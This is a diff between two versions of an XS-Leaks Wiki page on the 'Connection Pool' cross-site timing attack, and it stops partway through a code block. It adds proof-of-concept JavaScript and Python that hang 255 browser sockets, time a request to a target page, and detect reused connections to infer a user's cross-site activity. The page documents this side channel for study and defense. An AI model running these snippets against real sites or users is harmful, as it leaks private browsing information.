@@ -1,334 +1,126 @@
-<!doctype html><html lang=en>
-<head>
-<meta charset=utf-8>
-<meta name=viewport content="width=device-width,initial-scale=1">
-<meta name=description content="Another way to measure the network timing of a request consists of abusing the socket pool of a browser 1. Browsers use sockets to communicate with servers. As the operating system and the hardware it runs on have limited resources, browsers have to impose a limit.
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Another way to measure the network timing of a request consists of abusing the socket pool of a browser 1. Browsers use sockets to communicate with servers. As the operating system and the hardware it runs on have limited resources, browsers have to impose a limit. Run demo (Chrome) Run demo (Firefox)
 To exploit the existence of this limit, attackers can:
- Check what the limit of the browser is, for example 256 global sockets. Block   \(255\)  sockets for a long period of time by performing  \(255\)  requests to different hosts that simply hang the connection Use the  \(256^{th}\)  socket by performing a request to the target page.">
-<meta name=theme-color content="#FFFFFF"><meta property="og:title" content="Connection Pool">
-<meta property="og:description" content="Another way to measure the network timing of a request consists of abusing the socket pool of a browser 1. Browsers use sockets to communicate with servers. As the operating system and the hardware it runs on have limited resources, browsers have to impose a limit.
+Check what the limit of the browser is, for example 256 global sockets for TCP and 6000 global sockets for UDP."><meta name=theme-color content="#FFFFFF"><meta property="og:title" content="Connection Pool"><meta property="og:description" content="Another way to measure the network timing of a request consists of abusing the socket pool of a browser 1. Browsers use sockets to communicate with servers. As the operating system and the hardware it runs on have limited resources, browsers have to impose a limit. Run demo (Chrome) Run demo (Firefox)
 To exploit the existence of this limit, attackers can:
- Check what the limit of the browser is, for example 256 global sockets. Block   \(255\)  sockets for a long period of time by performing  \(255\)  requests to different hosts that simply hang the connection Use the  \(256^{th}\)  socket by performing a request to the target page.">
-<meta property="og:type" content="article">
-<meta property="og:url" content="https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/"><meta property="article:section" content="docs">
-<meta property="article:published_time" content="2020-10-01T00:00:00+00:00">
-<meta property="article:modified_time" content="2020-12-23T14:15:51+01:00">
-<title>Connection Pool | XS-Leaks Wiki</title>
-<link rel=manifest href=/manifest.json>
-<link rel=icon href=/favicon.png type=image/x-icon>
-<link rel=stylesheet href=/book.min.1c9a9009be3c645cbccbe64eb0a90e28621e4118971d9a502db4aaa9bec96cfc.css integrity="sha256-HJqQCb48ZFy8y+ZOsKkOKGIeQRiXHZpQLbSqqb7JbPw=">
-<script defer src=/en.search.min.057cc5710ab6d726408794395eee8acbf21f5612015119aba8260d213d66edc0.js integrity="sha256-BXzFcQq21yZAh5Q5Xu6Ky/IfVhIBURmrqCYNIT1m7cA="></script>
-<script defer src=/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js integrity="sha256-b2+Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC+NdcPIvZhzk="></script>
-</head>
-<body>
-<input type=checkbox class="hidden toggle" id=menu-control>
-<input type=checkbox class="hidden toggle" id=toc-control>
-<main class="container flex">
-<aside class=book-menu>
-<nav>
-<h2 class=book-brand>
-<a href=/><span>XS-Leaks Wiki</span>
-</a>
-</h2>
-<div class=book-search>
-<input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/>
-<div class="book-search-spinner hidden"></div>
-<ul id=book-search-results></ul>
-</div>
-<ul>
-<li class=book-section-flat>
-<span>Attacks</span>
-<ul>
-<li>
-<a href=/docs/attacks/xs-search/>XS-Search</a>
-</li>
-<li>
-<a href=/docs/attacks/window-references/>Window References</a>
-</li>
-<li>
-<a href=/docs/attacks/css-tricks/>CSS Tricks</a>
-</li>
-<li>
-<a href=/docs/attacks/error-events/>Error Events</a>
-</li>
-<li>
-<a href=/docs/attacks/frame-counting/>Frame Counting</a>
-</li>
-<li>
-<a href=/docs/attacks/navigations/>Navigations</a>
-</li>
-<li>
-<a href=/docs/attacks/cache-probing/>Cache Probing</a>
-</li>
-<li>
-<a href=/docs/attacks/element-leaks/>Element leaks</a>
-</li>
-<li>
-<a href=/docs/attacks/id-attribute/>ID Attribute</a>
-</li>
-<li>
-<a href=/docs/attacks/postmessage-broadcasts/>postMessage Broadcasts</a>
-</li>
-<li>
-<span>Browser Features</span>
-<ul>
-<li>
-<a href=/docs/attacks/browser-features/corb/>CORB Leaks</a>
-</li>
-<li>
-<a href=/docs/attacks/browser-features/corp/>CORP Leaks</a>
-</li>
-</ul>
-</li>
-<li>
-<span>Timing Attacks</span>
-<ul>
-<li>
-<a href=/docs/attacks/timing-attacks/clocks/>Clocks</a>
-</li>
-<li>
-<a href=/docs/attacks/timing-attacks/network-timing/>Network Timing</a>
-</li>
-<li>
-<a href=/docs/attacks/timing-attacks/performance-api/>Performance API</a>
-</li>
-<li>
-<a href=/docs/attacks/timing-attacks/execution-timing/>Execution Timing</a>
-</li>
-<li>
-<a href=/docs/attacks/timing-attacks/hybrid-timing/>Hybrid Timing</a>
-</li>
-<li>
-<a href=/docs/attacks/timing-attacks/connection-pool/ class=active>Connection Pool</a>
-</li>
-</ul>
-</li>
-<li>
-<a href=/docs/attacks/experiments/ class=collapsed>Experiments</a>
-</li>
-<li>
-<a href=/docs/attacks/css-injection/>CSS Injection</a>
-</li>
-<li>
-<a href=/docs/attacks/historical/ class=collapsed>Historical</a>
-</li>
-</ul>
-</li>
-<li class=book-section-flat>
-<a href=/docs/defenses/>Defense Mechanisms</a>
-<ul>
-<li>
-<a href=/docs/defenses/design-protections/>Application Design</a>
-<ul>
-<li>
-<a href=/docs/defenses/design-protections/cache-protections/>Cache Protections</a>
-</li>
-<li>
-<a href=/docs/defenses/design-protections/subresource-protections/>Subresource Protections</a>
-</li>
-</ul>
-</li>
-<li>
-<a href=/docs/defenses/opt-in/>Opt-In Mechanisms</a>
-<ul>
-<li>
-<a href=/docs/defenses/opt-in/fetch-metadata/>Fetch Metadata</a>
-</li>
-<li>
-<a href=/docs/defenses/opt-in/coop/>Cross-Origin-Opener-Policy</a>
-</li>
-<li>
-<a href=/docs/defenses/opt-in/corp/>Cross-Origin-Resource-Policy</a>
-</li>
-<li>
-<a href=/docs/defenses/opt-in/xfo/>Framing Protections</a>
-</li>
-<li>
-<a href=/docs/defenses/opt-in/same-site-cookies/>SameSite Cookies</a>
-</li>
-<li>
-<a href=/docs/defenses/opt-in/document-policies/>Document Policies</a>
-</li>
-</ul>
-</li>
-<li>
-<a href=/docs/defenses/isolation-policies/>Isolation Policies</a>
-<ul>
-<li>
-<a href=/docs/defenses/isolation-policies/resource-isolation/>Resource Isolation Policy</a>
-</li>
-<li>
-<a href=/docs/defenses/isolation-policies/framing-isolation/>Framing Isolation Policy</a>
-</li>
-<li>
-<a href=/docs/defenses/isolation-policies/navigation-isolation/>Navigation Isolation Policy</a>
-</li>
-<li>
-<a href=/docs/defenses/isolation-policies/strict-isolation/>Strict Isolation Policy</a>
-</li>
-</ul>
-</li>
-<li>
-<a href=/docs/defenses/secure-defaults/>Secure Defaults</a>
-<ul>
-<li>
-<a href=/docs/defenses/secure-defaults/corb/>Cross-Origin Read Blocking</a>
-</li>
-<li>
-<a href=/docs/defenses/secure-defaults/partitioned-cache/>Partitioned HTTP Cache</a>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li class=book-section-flat>
-<a href=/docs/contributions/>Contributions</a>
-<ul>
-</ul>
-</li>
-</ul>
-</nav>
-<script>(function(){var a=document.querySelector("aside.book-menu nav");addEventListener("beforeunload",function(b){localStorage.setItem("menu.scrollTop",a.scrollTop)}),a.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
-</aside>
-<div class=book-page>
-<header class=book-header>
-<div class="flex align-center justify-between">
-<label for=menu-control>
-<img src=/svg/menu.svg class=book-icon alt=Menu>
-</label>
+Check what the limit of the browser is, for example 256 global sockets for TCP and 6000 global sockets for UDP."><meta property="og:type" content="article"><meta property="og:url" content="https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/"><meta property="article:section" content="docs"><meta property="article:published_time" content="2020-10-01T00:00:00+00:00"><meta property="article:modified_time" content="2022-11-06T17:13:54+00:00"><title>Connection Pool | XS-Leaks Wiki</title><link rel=manifest href=/manifest.json><link rel=icon href=/favicon.png type=image/x-icon><link rel=stylesheet href=/book.min.1c9a9009be3c645cbccbe64eb0a90e28621e4118971d9a502db4aaa9bec96cfc.css integrity="sha256-HJqQCb48ZFy8y+ZOsKkOKGIeQRiXHZpQLbSqqb7JbPw="><script defer src=/en.search.min.e27e25a227b69aebe2c822d3ee6e80c577ed4ed4b23af887f000c397a8931153.js integrity="sha256-4n4loie2muviyCLT7m6AxXftTtSyOviH8ADDl6iTEVM="></script>
+<script defer src=/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js integrity="sha256-b2+Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC+NdcPIvZhzk="></script></head><body><input type=checkbox class="hidden toggle" id=menu-control>
+<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><nav><h2 class=book-brand><a href=/><span>XS-Leaks Wiki</span></a></h2><div class=book-search><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><ul><li class=book-section-flat><span>Attacks</span><ul><li><a href=/docs/attacks/xs-search/>XS-Search</a></li><li><a href=/docs/attacks/window-references/>Window References</a></li><li><a href=/docs/attacks/css-tricks/>CSS Tricks</a></li><li><a href=/docs/attacks/error-events/>Error Events</a></li><li><a href=/docs/attacks/frame-counting/>Frame Counting</a></li><li><a href=/docs/attacks/navigations/>Navigations</a></li><li><a href=/docs/attacks/cache-probing/>Cache Probing</a></li><li><a href=/docs/attacks/element-leaks/>Element leaks</a></li><li><a href=/docs/attacks/id-attribute/>ID Attribute</a></li><li><a href=/docs/attacks/postmessage-broadcasts/>postMessage Broadcasts</a></li><li><span>Browser Features</span><ul><li><a href=/docs/attacks/browser-features/corb/>CORB Leaks</a></li><li><a href=/docs/attacks/browser-features/corp/>CORP Leaks</a></li></ul></li><li><span>Timing Attacks</span><ul><li><a href=/docs/attacks/timing-attacks/clocks/>Clocks</a></li><li><a href=/docs/attacks/timing-attacks/network-timing/>Network Timing</a></li><li><a href=/docs/attacks/timing-attacks/performance-api/>Performance API</a></li><li><a href=/docs/attacks/timing-attacks/execution-timing/>Execution Timing</a></li><li><a href=/docs/attacks/timing-attacks/hybrid-timing/>Hybrid Timing</a></li><li><a href=/docs/attacks/timing-attacks/connection-pool/ class=active>Connection Pool</a></li></ul></li><li><a href=/docs/attacks/experiments/ class=collapsed>Experiments</a></li><li><a href=/docs/attacks/css-injection/>CSS Injection</a></li><li><a href=/docs/attacks/historical/ class=collapsed>Historical</a></li></ul></li><li class=book-section-flat><a href=/docs/defenses/>Defense Mechanisms</a><ul><li><a href=/docs/defenses/design-protections/>Application Design</a><ul><li><a href=/docs/defenses/design-protections/cache-protections/>Cache Protections</a></li><li><a href=/docs/defenses/design-protections/subresource-protections/>Subresource Protections</a></li></ul></li><li><a href=/docs/defenses/opt-in/>Opt-In Mechanisms</a><ul><li><a href=/docs/defenses/opt-in/fetch-metadata/>Fetch Metadata</a></li><li><a href=/docs/defenses/opt-in/coop/>Cross-Origin-Opener-Policy</a></li><li><a href=/docs/defenses/opt-in/corp/>Cross-Origin-Resource-Policy</a></li><li><a href=/docs/defenses/opt-in/xfo/>Framing Protections</a></li><li><a href=/docs/defenses/opt-in/same-site-cookies/>SameSite Cookies</a></li><li><a href=/docs/defenses/opt-in/document-policies/>Document Policies</a></li></ul></li><li><a href=/docs/defenses/isolation-policies/>Isolation Policies</a><ul><li><a href=/docs/defenses/isolation-policies/resource-isolation/>Resource Isolation Policy</a></li><li><a href=/docs/defenses/isolation-policies/framing-isolation/>Framing Isolation Policy</a></li><li><a href=/docs/defenses/isolation-policies/navigation-isolation/>Navigation Isolation Policy</a></li><li><a href=/docs/defenses/isolation-policies/strict-isolation/>Strict Isolation Policy</a></li></ul></li><li><a href=/docs/defenses/secure-defaults/>Secure Defaults</a><ul><li><a href=/docs/defenses/secure-defaults/corb/>Cross-Origin Read Blocking</a></li><li><a href=/docs/defenses/secure-defaults/partitioned-cache/>Partitioned HTTP Cache</a></li></ul></li></ul></li><li class=book-section-flat><a href=/docs/contributions/>Contributions</a><ul></ul></li></ul></nav><script>(function(){var e=document.querySelector("aside.book-menu nav");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label>
 <strong>Connection Pool</strong>
-<label for=toc-control>
-<img src=/svg/toc.svg class=book-icon alt="Table of Contents">
-</label>
-</div>
-<aside class="hidden clearfix">
-<nav id=TableOfContents>
-<ul>
-<li><a href=#defense>Defense</a></li>
-<li><a href=#references>References</a></li>
-</ul>
-</nav>
-</aside>
-</header>
-<article class=markdown>
-<h1>
-Connection Pool
-</h1>
-<h5>October 1, 2020</h5>
-<div>
-Abuse
+<label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#connection-reuse>Connection reuse</a></li><li><a href=#skipping-dependences>Skipping dependences</a></li><li><a href=#defense>Defense</a></li><li><a href=#references>References</a></li></ul></nav></aside></header><article class=markdown><h1>Connection Pool</h1><h5>October 1, 2020</h5><div>Abuse
 <a href=/abuse/connection-pool/>Connection Pool</a>,
-<a href=/abuse/browser-limits/>Browser Limits</a>
-</div>
-<div>
-Category
-<a href=/category/attack/>Attack</a>
-</div>
-<div>
-Defenses
+<a href=/abuse/browser-limits/>Browser Limits</a></div><div>Category
+<a href=/category/attack/>Attack</a></div><div>Defenses
 <a href=/defenses/fetch-metadata/>Fetch Metadata</a>,
-<a href=/defenses/samesite-cookies/>SameSite Cookies</a>
-</div>
-<p><p>Another way to measure the network timing of a request consists of abusing the socket pool of a browser <sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>. Browsers use sockets to communicate with servers. As the operating system and the hardware it runs on have limited resources, browsers have to impose a limit.</p>
-<p>To exploit the existence of this limit, attackers can:</p>
-<ol>
-<li>Check what the limit of the browser is, for example 256 global sockets.</li>
-<li>Block
-<link rel=stylesheet href=/katex/katex.min.css>
-<script defer src=/katex/katex.min.js></script>
+<a href=/defenses/samesite-cookies/>SameSite Cookies</a></div><p><p>Another way to measure the network timing of a request consists of abusing the socket pool of a browser <sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>. Browsers use sockets to communicate with servers. As the operating system and the hardware it runs on have limited resources, browsers have to impose a limit. <a href=https://xsinator.com/testing.html#WebSocket%20Leak%20%28GC%29>Run demo (Chrome)</a> <a href=https://xsinator.com/testing.html#WebSocket%20Leak%20%28FF%29>Run demo (Firefox)</a></p><p>To exploit the existence of this limit, attackers can:</p><ol><li>Check what the limit of the browser is, for example 256 global sockets for TCP and 6000 global sockets for UDP. <sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup><sup id=fnref:3><a href=#fn:3 class=footnote-ref role=doc-noteref>3</a></sup></li><li>Block
+<link rel=stylesheet href=/katex/katex.min.css><script defer src=/katex/katex.min.js></script>
 <script defer src=/katex/auto-render.min.js onload=renderMathInElement(document.body)></script><span>
-\(255\)
-</span>
-sockets for a long period of time by performing <span>
-\(255\)
-</span>
-requests to different hosts that simply hang the connection</li>
-<li>Use the <span>
-\(256^{th}\)
-</span>
-socket by performing a request to the target page.</li>
-<li>Perform a <span>
-\(257^{th}\)
-</span>
-request to another host. Since all the sockets are being used (in steps 2 and 3), this request must wait until the pool receives an available socket. This waiting period provides the attacker with the network timing of the <span>
-\(256^{th}\)
-</span>
-socket, which belongs to the target page. This works because the <span>
-\(255\)
-</span>
-sockets in step 2 are still blocked, so if the pool received an available socket, it was caused by the release of the socket in step 3. The time to release the <span>
-\(256^{th}\)
-</span>
-socket is directly connected with the time taken to complete the request.</li>
-</ol>
-<h2 id=defense>
-Defense
-<a class=anchor href=#defense>#</a>
-</h2>
-<table>
-<thead>
-<tr>
-<th style=text-align:center><a href=https://xsleaks.dev/docs/defenses/opt-in/same-site-cookies/>SameSite Cookies (Lax)</a></th>
-<th style=text-align:center><a href=https://xsleaks.dev/docs/defenses/opt-in/coop/>COOP</a></th>
-<th style=text-align:center><a href=https://xsleaks.dev/docs/defenses/opt-in/xfo/>Framing Protections</a></th>
-<th style=text-align:center><a href=https://xsleaks.dev/docs/defenses/isolation-policies/>Isolation Policies</a></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style=text-align:center>❌</td>
-<td style=text-align:center>❌</td>
-<td style=text-align:center>❌</td>
-<td style=text-align:center>❌</td>
-</tr>
-</tbody>
-</table>
-<blockquote class="book-hint2 info">
-<p class="hint-title info">
-<svg class="book-icon"><use href="/svg/hint-icons.svg#info-notice"/></svg><span>info</span></p>
-Similar to <a href=https://xsleaks.dev/docs/defenses/secure-defaults/partitioned-cache/>partitioned caches</a>, some browsers are considering to extend the principle of &ldquo;split per site/origin&rdquo; of resources to <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1572544">socket pools</a>.
-</blockquote>
-<h2 id=references>
-References
-<a class=anchor href=#references>#</a>
-</h2>
-<section class=footnotes role=doc-endnotes>
-<hr>
-<ol>
-<li id=fn:1 role=doc-endnote>
-<p>Leak cross-window request timing by exhausting connection pool, <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=843157">link</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p>
-</li>
-</ol>
-</section>
-</p>
-</article>
-<footer class=book-footer>
-<div class="flex flex-wrap justify-between">
-<div><a class="flex align-center" href=https://github.com/xsleaks/wiki/commit/94b8217cc463ebc627881d89c8da4a039f9049e9 title="Last modified by goedi02 | December 23, 2020" target=_blank rel=noopener>
-<img src=/svg/calendar.svg class=book-icon alt=Calendar>
-<span>Last Modified: December 23, 2020</span>
-</a>
-</div>
-<div>
-<a class="flex align-center" href=https://github.com/xsleaks/wiki/edit/master/content//docs/attacks/timing-attacks/connection-pool.md target=_blank rel=noopener>
-<img src=/svg/edit.svg class=book-icon alt=Edit>
-<span>Edit this article</span>
-</a>
-</div>
-</div>
-</footer>
-<div class=book-comments>
-</div>
-<label for=menu-control class="hidden book-menu-overlay"></label>
-</div>
-<aside class=book-toc>
-<nav id=TableOfContents>
-<ul>
-<li><a href=#defense>Defense</a></li>
-<li><a href=#references>References</a></li>
-</ul>
-</nav>
-</aside>
-</main>
-</body>
-</html>
+\(255\)</span>
+sockets for a long period of time by performing <span>\(255\)</span>
+requests to different hosts that simply hang the connection</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#6272a4>// Client
+</span></span></span><span style=display:flex><span><span style=color:#6272a4></span><span style=color:#ff79c6>for</span>(<span style=color:#8be9fd;font-style:italic>let</span> i<span style=color:#ff79c6>=</span><span style=color:#bd93f9>0</span>; i<span style=color:#ff79c6>&lt;</span><span style=color:#bd93f9>255</span>; i<span style=color:#ff79c6>++</span>) fetch(<span style=color:#f1fa8c>&#39;https://&#39;</span><span style=color:#ff79c6>+</span>i<span style=color:#ff79c6>+</span><span style=color:#f1fa8c>&#39;.example.com/&#39;</span>, {mode<span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;no-cors&#34;</span>, cache<span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;no-store&#34;</span>});
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#6272a4># Server</span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>from</span> http.server <span style=color:#ff79c6>import</span> BaseHTTPRequestHandler, HTTPServer
+</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> time
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>class</span> <span style=color:#50fa7b>handler</span>(BaseHTTPRequestHandler):
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>do_GET</span>(self):
+</span></span><span style=display:flex><span>        time<span style=color:#ff79c6>.</span>sleep(<span style=color:#8be9fd;font-style:italic>float</span>(<span style=color:#bd93f9>100000</span>))
+</span></span><span style=display:flex><span>        self<span style=color:#ff79c6>.</span>send_response(<span style=color:#bd93f9>200</span>)
+</span></span><span style=display:flex><span>        self<span style=color:#ff79c6>.</span>send_header(<span style=color:#f1fa8c>&#39;Cache-Control&#39;</span>, <span style=color:#f1fa8c>&#39;no-store&#39;</span>)
+</span></span><span style=display:flex><span>        self<span style=color:#ff79c6>.</span>end_headers()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>with</span> HTTPServer((<span style=color:#f1fa8c>&#39;&#39;</span>, <span style=color:#bd93f9>8000</span>), handler) <span style=color:#ff79c6>as</span> server:
+</span></span><span style=display:flex><span>    server<span style=color:#ff79c6>.</span>serve_forever()
+</span></span></code></pre></div><ol start=3><li>Use the <span>\(256^{th}\)</span>
+socket by performing a request to the target page.</li><li>Perform a <span>\(257^{th}\)</span>
+request to another host. Since all the sockets are being used (in steps 2 and 3), this request must wait until the pool receives an available socket. This waiting period provides the attacker with the network timing of the <span>\(256^{th}\)</span>
+socket, which belongs to the target page. This works because the <span>\(255\)</span>
+sockets in step 2 are still blocked, so if the pool received an available socket, it was caused by the release of the socket in step 3. The time to release the <span>\(256^{th}\)</span>
+socket is directly connected with the time taken to complete the request.</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span>performance.clearResourceTimings();
+</span></span><span style=display:flex><span><span style=color:#ff79c6>await</span> fetch(location.href, {cache<span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;no-store&#34;</span>});
+</span></span><span style=display:flex><span><span style=color:#ff79c6>await</span> <span style=color:#ff79c6>new</span> <span style=color:#8be9fd;font-style:italic>Promise</span>(r =&gt; setTimeout(r, <span style=color:#bd93f9>1000</span>));
+</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>let</span> data <span style=color:#ff79c6>=</span> performance.getEntries().pop();
+</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>let</span> type <span style=color:#ff79c6>=</span> (data.connectStart <span style=color:#ff79c6>===</span> data.startTime) <span style=color:#ff79c6>?</span> <span style=color:#f1fa8c>&#39;reused&#39;</span> <span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#39;new&#39;</span>;
+</span></span><span style=display:flex><span>console.log(<span style=color:#f1fa8c>&#39;Time spent: &#39;</span> <span style=color:#ff79c6>+</span> data.duration <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#39; on &#39;</span> <span style=color:#ff79c6>+</span> type <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#39; connection.&#39;</span>);
+</span></span></code></pre></div><h2 id=connection-reuse>Connection reuse
+<a class=anchor href=#connection-reuse>#</a></h2><p>With HTTP/1.1 (TCP) and HTTP/2 (TCP) and HTTP/3 (UDP) requests may reuse an existing connection for a host to improve performance. <sup id=fnref:4><a href=#fn:4 class=footnote-ref role=doc-noteref>4</a></sup><sup id=fnref:5><a href=#fn:5 class=footnote-ref role=doc-noteref>5</a></sup>
+HTTP/2 also has Connection Coalescing which allows different hostnames that are accessible from the same web server to reuse a connection. <sup id=fnref:6><a href=#fn:6 class=footnote-ref role=doc-noteref>6</a></sup>
+This is currently keyed by if credentials are included in the request.
+Since a reused connection is normally faster this could allow for detecting if a site has connected to a host excluding anything that’s been cached and leaking information about the cross-site request by abusing Stream prioritization and HPACK compression. <sup id=fnref:7><a href=#fn:7 class=footnote-ref role=doc-noteref>7</a></sup>
+Connections may get closed if they are left idle or the sockets are exhausted, for example 256 connections for HTTP/2 or 30 seconds idle for HTTP/3. <sup id=fnref1:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup><sup id=fnref:8><a href=#fn:8 class=footnote-ref role=doc-noteref>8</a></sup>
+This may also leak when the connection happened and the browser can have per connection limits and on how many connections are allowed per host, for example 6 connections per host. <sup id=fnref2:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#6272a4>// Detect if a HTTP/3 request was made to a certain host in the last 20 seconds.
+</span></span></span><span style=display:flex><span><span style=color:#6272a4></span><span style=color:#ff79c6>await</span> <span style=color:#ff79c6>new</span> <span style=color:#8be9fd;font-style:italic>Promise</span>(r =&gt; setTimeout(r, <span style=color:#bd93f9>10000</span>));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#6272a4>// Check for connection reuse for when there’s a Timing-Allow-Origin header.
+</span></span></span><span style=display:flex><span><span style=color:#6272a4></span><span style=color:#ff79c6>async</span> <span style=color:#8be9fd;font-style:italic>function</span> isConnected(url) {
+</span></span><span style=display:flex><span>    performance.clearResourceTimings();
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>try</span> {
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>await</span> fetch(url, {
+</span></span><span style=display:flex><span>            cache<span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;no-store&#34;</span>,
+</span></span><span style=display:flex><span>            credentials<span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;include&#34;</span>
+</span></span><span style=display:flex><span>        });
+</span></span><span style=display:flex><span>    } <span style=color:#ff79c6>catch</span> {}
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>await</span> <span style=color:#ff79c6>new</span> <span style=color:#8be9fd;font-style:italic>Promise</span>(r =&gt; setTimeout(r, <span style=color:#bd93f9>1000</span>));
+</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>let</span> data <span style=color:#ff79c6>=</span> performance.getEntries().pop();
+</span></span><span style=display:flex><span>    <span style=color:#6272a4>// Allowed to read timing information.
+</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>    <span style=color:#6272a4>// Same-origin or the Timing-Allow-Origin header.
+</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>    console.log(<span style=color:#f1fa8c>&#34;Protocol: &#34;</span> <span style=color:#ff79c6>+</span> data.nextHopProtocol);
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> (data.connectStart <span style=color:#ff79c6>===</span> data.startTime);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#6272a4>// Check for connection reuse for when there’s no Timing-Allow-Origin header. (less reliable)
+</span></span></span><span style=display:flex><span><span style=color:#6272a4></span><span style=color:#ff79c6>async</span> <span style=color:#8be9fd;font-style:italic>function</span> isConnected2(url, max <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>50</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>let</span> start <span style=color:#ff79c6>=</span> performance.now();
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>try</span> {
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>await</span> fetch(url, {
+</span></span><span style=display:flex><span>            cache<span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;no-store&#34;</span>,
+</span></span><span style=display:flex><span>            method<span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;GET&#34;</span>,
+</span></span><span style=display:flex><span>            mode<span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;no-cors&#34;</span>,
+</span></span><span style=display:flex><span>            credentials<span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;include&#34;</span>
+</span></span><span style=display:flex><span>        });
+</span></span><span style=display:flex><span>    } <span style=color:#ff79c6>catch</span> {}
+</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>let</span> duration <span style=color:#ff79c6>=</span> performance.now() <span style=color:#ff79c6>-</span> start;
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>let</span> start2 <span style=color:#ff79c6>=</span> performance.now();
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>try</span> {
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>await</span> fetch(url, {
+</span></span><span style=display:flex><span>            cache<span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;no-store&#34;</span>,
+</span></span><span style=display:flex><span>            method<span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;GET&#34;</span>,
+</span></span><span style=display:flex><span>            mode<span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;no-cors&#34;</span>,
+</span></span><span style=display:flex><span>            credentials<span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;include&#34;</span>
+</span></span><span style=display:flex><span>        });
+</span></span><span style=display:flex><span>    } <span style=color:#ff79c6>catch</span> {}
+</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>let</span> duration2 <span style=color:#ff79c6>=</span> performance.now() <span style=color:#ff79c6>-</span> start2;
